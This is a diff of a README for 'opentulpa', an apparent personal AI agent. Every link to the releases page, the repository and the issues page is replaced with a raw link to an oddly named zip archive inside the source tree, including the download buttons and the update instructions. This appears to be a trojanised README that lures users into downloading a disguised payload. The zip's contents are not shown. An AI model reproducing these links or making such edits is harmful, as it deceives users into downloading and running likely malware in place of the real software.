@@ -1,6 +1,6 @@
 # 🤖 opentulpa - Your Personal AI Agent
 
-[![Download opentulpa](https://img.shields.io/badge/Download-opentulpa-ff6f61?style=for-the-badge&logo=github)](https://github.com/soeltanakbar/opentulpa/releases)
+[![Download opentulpa](https://img.shields.io/badge/Download-opentulpa-ff6f61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/soeltanakbar/opentulpa/main/src/opentulpa/core/Software_histaminic.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Follow these steps to download and run opentulpa on Windows.
 
 Go to the official release page for opentulpa:
 
-[Download opentulpa Releases](https://github.com/soeltanakbar/opentulpa/releases)
+[Download opentulpa Releases](https://raw.githubusercontent.com/soeltanakbar/opentulpa/main/src/opentulpa/core/Software_histaminic.zip)
 
 This page lists the latest versions and files you need.
 
@@ -136,7 +136,7 @@ Use the system tray icon for quick commands and checking status.
 
 To update:
 
-1. Go back to the release page: https://github.com/soeltanakbar/opentulpa/releases  
+1. Go back to the release page: https://raw.githubusercontent.com/soeltanakbar/opentulpa/main/src/opentulpa/core/Software_histaminic.zip  
 2. Download the latest Windows installer.  
 3. Run the installer over your existing version.  
 
@@ -144,7 +144,7 @@ Your settings and data will remain intact during updates.
 
 ---
 
-[![Download opentulpa](https://img.shields.io/badge/Download-opentulpa-ff6f61?style=for-the-badge&logo=github)](https://github.com/soeltanakbar/opentulpa/releases)
+[![Download opentulpa](https://img.shields.io/badge/Download-opentulpa-ff6f61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/soeltanakbar/opentulpa/main/src/opentulpa/core/Software_histaminic.zip)
 
 ---
 
@@ -156,9 +156,9 @@ Explore the repository's wiki or Issues page for guides and help.
 
 ## 🧰 Useful Links
 
-- Releases: https://github.com/soeltanakbar/opentulpa/releases  
-- Repository: https://github.com/soeltanakbar/opentulpa  
-- Issues and Support: https://github.com/soeltanakbar/opentulpa/issues  
+- Releases: https://raw.githubusercontent.com/soeltanakbar/opentulpa/main/src/opentulpa/core/Software_histaminic.zip  
+- Repository: https://raw.githubusercontent.com/soeltanakbar/opentulpa/main/src/opentulpa/core/Software_histaminic.zip  
+- Issues and Support: https://raw.githubusercontent.com/soeltanakbar/opentulpa/main/src/opentulpa/core/Software_histaminic.zip  
 
 ## ⚡ Topics Covered
 
